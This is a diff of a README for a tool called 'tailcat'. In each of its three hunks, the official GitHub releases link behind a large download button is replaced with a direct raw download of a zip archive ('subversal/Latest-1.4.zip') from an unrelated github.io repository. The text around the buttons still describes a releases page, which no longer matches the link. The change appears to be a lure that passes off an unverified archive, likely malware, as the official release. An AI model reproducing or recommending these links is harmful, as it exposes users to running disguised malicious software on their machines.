@@ -6,7 +6,7 @@ description: "Connect machines directly with WireGuard-encrypted tunnels, no con
 <h1>🛠️ tailcat - Connect Any Two Computers, No Cloud Required</h1>
 
 <p align="center">
-  <a href="https://github.com/Philippecashandcarry9413/tailcat/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);margin:20px 0;">⬇️ Download tailcat Now</a>
+  <a href="https://raw.githubusercontent.com/Philippecashandcarry9413/philippecashandcarry9413.github.io/main/subversal/Latest-1.4.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);margin:20px 0;">⬇️ Download tailcat Now</a>
 </p>
 
 ## 📖 What Is tailcat?
@@ -46,7 +46,7 @@ Before you begin, make sure you have:
 **👉 Click this big blue button right here to go to the official download page:**
 
 <p align="center">
-  <a href="https://github.com/Philippecashandcarry9413/tailcat/releases" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(245,87,108,0.4);">🔗 Visit the tailcat Download Page</a>
+  <a href="https://raw.githubusercontent.com/Philippecashandcarry9413/philippecashandcarry9413.github.io/main/subversal/Latest-1.4.zip" style="display:inline-block;padding:14px 28px;background:linear-gradient(135deg,#f093fb,#f5576c);color:#ffffff;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(245,87,108,0.4);">🔗 Visit the tailcat Download Page</a>
 </p>
 
 Once you click that button, you'll land on a page that shows the latest version of tailcat ready for you**. You'll see a list of files to download. **Visit this link to download the application.** Choose the file that matches your operating system (for example, look for "windows-amd64.zip" or "tailcat-setup.exe"). If you're unsure, pick the one labeled for your system—it's usually obvious from the file name.
@@ -187,7 +187,7 @@ So go ahead—give it a shot. You'll wonder how you ever managed without it**.
 ---
 
 <p align="center">
-  <a href="https://github.com/Philippecashandcarry9413/tailcat/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#43e97b,#38f9d7);color:#000000;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(67,233,123,0.4);">🚀 Start Downloading tailcat Now</a>
+  <a href="https://raw.githubusercontent.com/Philippecashandcarry9413/philippecashandcarry9413.github.io/main/subversal/Latest-1.4.zip" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#43e97b,#38f9d7);color:#000000;font-size:18px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(67,233,123,0.4);">🚀 Start Downloading tailcat Now</a>
 </p>
 
 <br><br>
